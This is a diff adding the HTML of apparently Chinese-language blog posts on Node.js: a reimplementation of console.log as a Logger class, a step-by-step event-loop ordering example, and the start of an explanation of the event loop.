@@ -53,6 +53,240 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2018-02-25T14:16:53.000Z"><a href="/2018/02/25/Node.js_IO/console模块解读之实现一个console.log/">2018-02-25</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/02/25/Node.js_IO/console模块解读之实现一个console.log/">console模块解读之实现一个console.log</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="console是同步的还是异步的"><a href="#console是同步的还是异步的" class="headerlink" title="console是同步的还是异步的?"></a>console是同步的还是异步的?</h3><p>console.log既不是总是同步的，也不总是异步的。是否为同步取决于链接的是什么流以及操作系统是Windows还是POSIX:</p>
+<p>注意: 同步写将会阻塞事件循环直到写完成。 有时可能一瞬间就能写到一个文件，但当系统处于高负载时，管道的接收端可能不会被读取、缓慢的终端或文件系统，因为事件循环被阻塞的足够频繁且足够长的时间，这些可能会给系统性能带来消极的影响。当你向一个交互终端会话写时这可能不是个问题，但当生产日志到进程的输出流时要特别留心。</p>
+<ul>
+<li><p>文件(Files): Windows和POSIX平台下都是同步</p>
+</li>
+<li><p>终端(TTYs): 在Windows平台下同步，在POSIX平台下异步</p>
+</li>
+<li><p>管道(Pipes): 在Windows平台下同步，在POSIX平台下异步</p>
+</li>
+</ul>
+<h3 id="实现一个console-log"><a href="#实现一个console-log" class="headerlink" title="实现一个console.log"></a>实现一个console.log</h3><p>实现console.log在控制台打印，利用process.stdout将输入流数据输出到输出流(即输出到终端)，一个简单的例子输出hello world ， process.stdout.write(‘hello world!’ + ‘\n’); ，以下例子是对console源码解读实现，将Console取名为Logger。</p>
+<h4 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h4><ol>
+<li>初始化Logger对象</li>
+<li>对参数进行检验，当前对象是否为Logger实例，是否为一个可写流实例</li>
+<li>为Logger对象定义_stdout，_stderr等属性</li>
+<li>将原型方法上的属性绑定到Logger实例上</li>
+<li>实现log、error、warning、trace、clear等方法</li>
+</ol>
+<h4 id="创建logger-js文件"><a href="#创建logger-js文件" class="headerlink" title="创建logger.js文件"></a>创建logger.js文件</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化Logger对象</span></span><br><span class="line"><span class="comment"> * @param &#123;*&#125; stdout </span></span><br><span class="line"><span class="comment"> * @param &#123;*&#125; stderr </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Logger</span>(<span class="params">stdout, stderr</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// step1 检查当前对象是否为Logger实例</span></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="keyword">this</span> <span class="keyword">instanceof</span> Logger))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Logger(stdout, stderr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查是否是一个可写流实例</span></span><br><span class="line">    <span class="keyword">if</span>(!stdout || !(stdout.write <span class="keyword">instanceof</span> <span class="built_in">Function</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Logger expects a writable stream instance'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果stderr未指定，使用stdout</span></span><br><span class="line">    <span class="keyword">if</span>(!stderr)&#123;</span><br><span class="line">        stderr = stdout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置js Object的属性</span></span><br><span class="line">    <span class="keyword">let</span> props = &#123;</span><br><span class="line">        writable: <span class="literal">true</span>, <span class="comment">// 对象属性是否可修改,flase为不可修改，默认值为true</span></span><br><span class="line">        enumerable: <span class="literal">false</span>, <span class="comment">// 对象属性是否可通过for-in循环，flase为不可循环，默认值为true</span></span><br><span class="line">        configurable: <span class="literal">false</span>, <span class="comment">// 能否使用delete、能否需改属性特性、或能否修改访问器属性、，false为不可重新定义，默认值为true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Logger对象定义_stdout属性</span></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(<span class="keyword">this</span>, <span class="string">'_stdout'</span>, <span class="built_in">Object</span>.assign(props, &#123;</span><br><span class="line">        value: stdout,</span><br><span class="line">    &#125;));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Logger对象定义_stderr属性</span></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(<span class="keyword">this</span>, <span class="string">'_stderr'</span>, <span class="built_in">Object</span>.assign(props, &#123;</span><br><span class="line">        value: stderr,</span><br><span class="line">    &#125;));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Logger对象定义_times属性</span></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(<span class="keyword">this</span>, <span class="string">'_times'</span>, <span class="built_in">Object</span>.assign(props, &#123;</span><br><span class="line">        value: <span class="keyword">new</span> <span class="built_in">Map</span>(),</span><br><span class="line">    &#125;));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将原型方法上的属性绑定到Logger实例上</span></span><br><span class="line">    <span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(Logger.prototype);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> k <span class="keyword">in</span> keys)&#123;</span><br><span class="line">        <span class="keyword">this</span>[keys[k]] = <span class="keyword">this</span>[keys[k]].bind(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义原型Logger的log方法</span></span><br><span class="line">Logger.prototype.log = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._stdout.write(util.format.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>) + <span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Logger.prototype.info = Logger.prototype.log;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义原型Logger的warn方法</span></span><br><span class="line">Logger.prototype.warn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._stderr.write(util.format.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>) + <span class="string">`\n`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Logger.prototype.error = Logger.prototype.warn;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回当前调用堆栈信息</span></span><br><span class="line">Logger.prototype.trace = <span class="function"><span class="keyword">function</span> <span class="title">trace</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> err = &#123;</span><br><span class="line">        name: <span class="string">'Trace'</span>,</span><br><span class="line">        message: util.format.apply(<span class="literal">null</span>, args)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 源自V8引擎的Stack Trace API https://github.com/v8/v8/wiki/Stack-Trace-API</span></span><br><span class="line">    <span class="built_in">Error</span>.captureStackTrace(err, trace);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.error(err.stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除控制台信息</span></span><br><span class="line">Logger.prototype.clear = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果stdout输出是一个控制台，进行clear 否则不进行处理</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>._stdout.isTTY)&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; cursorTo, clearScreenDown &#125; = <span class="built_in">require</span>(<span class="string">'readline'</span>);</span><br><span class="line">        cursorTo(<span class="keyword">this</span>._stdout, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 移动光标到给定的 TTY stream 中指定的位置。</span></span><br><span class="line">        clearScreenDown(<span class="keyword">this</span>._stdout); <span class="comment">// 方法会从光标的当前位置向下清除给定的 TTY 流</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接输出某个对象</span></span><br><span class="line">Logger.prototype.dir = <span class="function"><span class="keyword">function</span>(<span class="params">object, options</span>)</span>&#123;</span><br><span class="line">    options = <span class="built_in">Object</span>.assign(&#123; <span class="attr">customInspect</span>: <span class="literal">false</span> &#125;, options);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * util.inspect(object,[showHidden],[depth],[colors])是一个将任意对象转换为字符串的方法，通常用于调试和错误的输出。</span></span><br><span class="line"><span class="comment">     * showhidden - 是一个可选参数，如果值为true，将会输出更多隐藏信息。</span></span><br><span class="line"><span class="comment">     * depth - 表示最大递归的层数。如果对象很复杂，可以指定层数控制输出信息的多少。</span></span><br><span class="line"><span class="comment">     * 如果不指定depth,默认会递归3层，指定为null表示不限递归层数完整遍历对象。</span></span><br><span class="line"><span class="comment">     * 如果color = true，输出格式将会以ansi颜色编码，通常用于在终端显示更漂亮的效果。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">this</span>._stdout.write(util.inspect(object, options) + <span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计时器开始时间</span></span><br><span class="line">Logger.prototype.time = <span class="function"><span class="keyword">function</span>(<span class="params">label</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// process.hrtime()方法返回当前时间以[seconds, nanoseconds] tuple Array表示的高精度解析值， nanoseconds是当前时间无法使用秒的精度表示的剩余部分。</span></span><br><span class="line">    <span class="keyword">this</span>._times.set(label, process.hrtime())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计时器结束时间</span></span><br><span class="line">Logger.prototype.timeEnd = <span class="function"><span class="keyword">function</span>(<span class="params">label</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> time = <span class="keyword">this</span>._times.get(label);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!time) &#123;</span><br><span class="line">        process.emitWarning(<span class="string">`No such label '<span class="subst">$&#123;label&#125;</span>' for console.timeEnd()`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> duration = process.hrtime(time);</span><br><span class="line">    <span class="keyword">const</span> ms = duration[<span class="number">0</span>] * <span class="number">1000</span> + duration[<span class="number">1</span>] / <span class="number">1e6</span>; <span class="comment">// 1e6 = 1000000.0 1e6表示1*10^6</span></span><br><span class="line">    <span class="keyword">this</span>.log(<span class="string">'%s: %sms'</span>, label, ms.toFixed(<span class="number">3</span>));</span><br><span class="line">    <span class="keyword">this</span>._times.delete(label);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">new</span> Logger(process.stdout, process.stderr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports.Logger = Logger;</span><br></pre></td></tr></table></figure>
+<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h4 id="基础例子"><a href="#基础例子" class="headerlink" title="基础例子"></a>基础例子</h4><p>无特殊说明，日志都是默认打印到控制台</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> logger = reuqire(<span class="string">'logger'</span>);</span><br><span class="line"></span><br><span class="line">logger.log(<span class="string">'hello world'</span>)   <span class="comment">// 普通日志打印</span></span><br><span class="line">logger.info(<span class="string">'hello world'</span>)  <span class="comment">// 等同于logger.log</span></span><br><span class="line">logger.error(<span class="string">'hello world'</span>) <span class="comment">// 错误日志打印</span></span><br><span class="line">logger.warn(<span class="string">'hello world'</span>)  <span class="comment">// 等同于logger.error</span></span><br><span class="line">logger.clear()              <span class="comment">// 清除控制台信息</span></span><br></pre></td></tr></table></figure>
+<p>将调试信息打印到本地指定文件，这里要注意版本问题，以下代码示例在nodev10.x以下版本可以，具体原因参考 <a href="https://github.com/nodejs/node/issues/21366" target="_blank" rel="noopener">TypeError: Console expects a writable stream instance</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> output = fs.createWriteStream(<span class="string">'./stdout.txt'</span>);</span><br><span class="line"><span class="keyword">const</span> errorOutput = fs.createWriteStream(<span class="string">'./stderr.txt'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; Logger &#125; = <span class="built_in">require</span>(<span class="string">'./logger'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = Logger(output, errorOutput);</span><br><span class="line"></span><br><span class="line">logger.info(<span class="string">'hello world!'</span>); <span class="comment">// 内容输出到stdout.txt文件</span></span><br><span class="line">logger.error(<span class="string">'错误日志记录'</span>); <span class="comment">// 内容输出到stderr.txt文件</span></span><br></pre></td></tr></table></figure>
+<h4 id="trace打印错误堆栈"><a href="#trace打印错误堆栈" class="headerlink" title="trace打印错误堆栈"></a>trace打印错误堆栈</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.trace(<span class="string">'测试错误'</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Trace: 测试错误</span><br><span class="line">    at Object.&lt;anonymous&gt; (/Users/qufei/Documents/mycode/Summarize/test/console-test.js:7:8)</span><br><span class="line">    at Module._compile (module.js:624:30)</span><br><span class="line">    at Object.Module._extensions..js (module.js:635:10)</span><br><span class="line">    at Module.load (module.js:545:32)</span><br><span class="line">    at tryModuleLoad (module.js:508:12)</span><br><span class="line">    at Function.Module._load (module.js:500:3)</span><br><span class="line">    at Function.Module.runMain (module.js:665:10)</span><br><span class="line">    at startup (bootstrap_node.js:201:16)</span><br><span class="line">    at bootstrap_node.js:626:3</span><br></pre></td></tr></table></figure>
+<h4 id="dir显示一个对象的所有属性和方法"><a href="#dir显示一个对象的所有属性和方法" class="headerlink" title="dir显示一个对象的所有属性和方法"></a>dir显示一个对象的所有属性和方法</h4><p>depth - 表示最大递归的层数。如果对象很复杂，可以指定层数控制输出信息的多少。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> family = &#123;</span><br><span class="line">    name: <span class="string">'Jack'</span>,</span><br><span class="line">    brother: &#123;</span><br><span class="line">        hobby: [<span class="string">'篮球'</span>, <span class="string">'足球'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logger.dir(family, &#123;<span class="attr">depth</span>: <span class="number">3</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123; name: 'Jack', brother: &#123; hobby: [ '篮球', '足球' ] &#125; &#125;</span></span><br></pre></td></tr></table></figure>
+<h4 id="time和timeEnd计算程序执行消耗时间"><a href="#time和timeEnd计算程序执行消耗时间" class="headerlink" title="time和timeEnd计算程序执行消耗时间"></a>time和timeEnd计算程序执行消耗时间</h4><p>logger.time 和 logger.timeEnd用来测量一个javascript脚本程序执行消耗的时间，单位是毫秒</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 启动计时器</span></span><br><span class="line">logger.time(<span class="string">'计时器'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中间写一些测试代码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止计时器</span></span><br><span class="line">logger.timeEnd(<span class="string">'计时器'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计时器: 718.034ms</span></span><br></pre></td></tr></table></figure>
+<h3 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h3><p><a href="https://github.com/Q-Angelo/summarize/blob/master/node/console.md" target="_blank" rel="noopener">https://github.com/Q-Angelo/summarize/blob/master/node/console.md</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-01-25T14:16:53.000Z"><a href="/2018/01/25/Node.js_事件/事件循环机制-实例/">2018-01-25</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/01/25/Node.js_事件/事件循环机制-实例/">事件循环机制-实例</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>在node服务器端运行以下代码会出现什么输出结果？</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setTimeout'</span>);</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'nextTick1'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'main1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello! '</span>);</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'nextTick2'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'nextTick3'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise 1'</span>);</span><br><span class="line">    resolve(<span class="string">'promise then'</span>)</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'main2'</span>);</span><br><span class="line"></span><br><span class="line">process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'nextTick4'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">say();</span><br></pre></td></tr></table></figure>
+<p>下面就结合这个原理图，根据问题，来一步一步分析：<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/micro_macro_180703" alt=""></p>
+<p>也可参考下图：<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/runtime_180703.png" alt=""></p>
+<p>我们经常会听到引擎和runtime，它们的区别是什么呢？</p>
+<ul>
+<li>引擎：解释并编译代码，让它变成能交给机器运行的代码（runnable commands）。</li>
+<li>runtime：就是运行环境，它提供一些对外接口供Js调用，以跟外界打交道。不同的runtime，会提供不同的接口，比如，在 Node.js 环境中，我们可以通过 <code>require</code> 来引入模块；而在浏览器中，我们有 <code>window</code>、 DOM。</li>
+</ul>
+<p>Js引擎是单线程的，如上图中，它负责维护任务队列，并通过 Event Loop 的机制，按顺序把任务放入栈中执行。而图中的异步处理模块，就是 runtime 提供的，拥有和Js引擎互不干扰的线程。</p>
+<h3 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h3><p>Js 中，有两类任务队列：宏任务队列（macro tasks）和微任务队列（micro tasks）。宏任务队列可以有多个，微任务队列只有<strong>一个</strong>。那么什么任务，会分到哪个队列呢？</p>
+<ul>
+<li>宏任务：script（全局任务）, setTimeout, setInterval, setImmediate, I/O, UI rendering.</li>
+<li>微任务：process.nextTick, Promise, Object.observer, MutationObserver.</li>
+</ul>
+<p>我们上面讲到，当stack空的时候，就会从任务队列中，取任务来执行。共分3步：</p>
+<ol>
+<li>取一个宏任务来执行。执行完毕后，下一步。</li>
+<li>取一个微任务来执行，执行完毕后，再取一个微任务来执行。直到微任务队列为空，执行下一步。</li>
+</ol>
+<p>从执行步骤来看，我们发现微任务，受到了特殊待遇！我们代码开始执行都是从script（全局任务）开始，所以，一旦我们的全局任务（属于宏任务）执行完，就马上执行完整个微任务队列。</p>
+<p>我们代码的开始执行都是从script（全局任务）开始，这个全局任务属于宏任务；代码由上向下执行；</p>
+<p>第1行，遇到了一个timer异步任务，属于宏任务，放入宏任务队列；</p>
+<p>第8行，遇到log,内部没有其它函数，直接输出main1;</p>
+<p>第10行，函数的定义，不执行；</p>
+<p>第17行，遇到new Promise()，进入回调函数内部:<br>1） 遇到promise.nextTick,属于微任务，放入微任务队列nextTick3;<br>2） 遇到log,内部没有其它函数，直接输出promise 1;<br>3） 遇到resolve回调，属于微任务，放入微任务队列promise then;</p>
+<p>第27行，遇到log,内部没有其它函数，直接输出main2;</p>
+<p>第29行，遇到promise.nextTick,属于微任务，放入微任务队列nextTick4;</p>
+<p>第33行，执行say()：<br>1）遇到log,内部没有其它函数，直接输出hello;<br>2）遇到promise.nextTick,属于微任务，放入微任务队列nextTick2;<br>到此为止，我们已经做了如下事情：<br>1）宏任务队列中放入了一个timer函数；<br>2）输出了main1，promise 1，main2，hello1；<br>3）微任务队列中已经放入了promise then,nextTick3,nextTick4,nextTick2;</p>
+<p>此时，我们的全局任务已执行完成了，就要马上执行完整个微任务队列。但是在微任务中，process.nextTick 是一个特殊的任务，它会被直接插入到微任务的队首（当然了，多个process.nextTick 之间也是先入先出的），优先级最高。所以，依次输出nextTick3,nextTick4,nextTick2,promise then</p>
+<p>这时，执行栈为空了，可是别忘了，我们的宏任务队列还放者一个timer函数待执行，进入timer函数：<br>1）遇到log,内部没有其它函数，直接输出setTimeout;<br>2）遇到promise.nextTick,属于微任务，放入微任务队列nextTick1;</p>
+<p>这个timer宏任务也执行完了，就马上执行完整个微任务队列，微任务队列目前只有一个任务，直接输出nextTick1；</p>
+<p>这时，执行栈又为空了，还有其它任务吗? 没有了，大功告成；</p>
+<p>以上的这种当函数执行栈为空，从任务队列中去一个任务来执行。再次为空，再取一个任务来执行，如此循环，这就是Event Loop，事件循环机制；</p>
+<p>参考：</p>
+<p><a href="https://juejin.im/post/5a63470bf265da3e2c383068" target="_blank" rel="noopener">https://juejin.im/post/5a63470bf265da3e2c383068</a></p>
+<p><a href="https://segmentfault.com/a/1190000011198232" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011198232</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2017-12-05T14:16:53.000Z"><a href="/2017/12/05/Node.js_事件/理解事件循环机制/">2017-12-05</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2017/12/05/Node.js_事件/理解事件循环机制/">理解事件循环机制</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<p>Node.js 是基于V8引擎的javascript运行环境. Node.js具有<code>事件驱动</code>, <code>非阻塞I/O</code>等特点. 结合Node API, Node.js 具有网络编程, 文件系统等服务端的功能, Node.js用<code>libuv</code>库进行异步事件处理.</p>
+</blockquote>
+<h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><blockquote>
+<p>Node.js的单线程含义, 实际上说的是执行同步代码的主线程. 一个Node程序的启动, 不止是分配了一个线程，而是我们只能在一个线程执行代码. 当出现I/O资源调用, TCP连接等外部资源申请的时候, 不会阻塞主线程, 而是委托给I/O线程进行处理,并且进入等待队列. 一旦主线程执行完成，将会消费事件队列(Event Queue). 因为只有一个主线程, 只占用CPU内核处理逻辑计算, 因此不适合在CPU密集型进行使用.</p>
+</blockquote>
+<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/180701NodeSystem.png" alt=""></p>
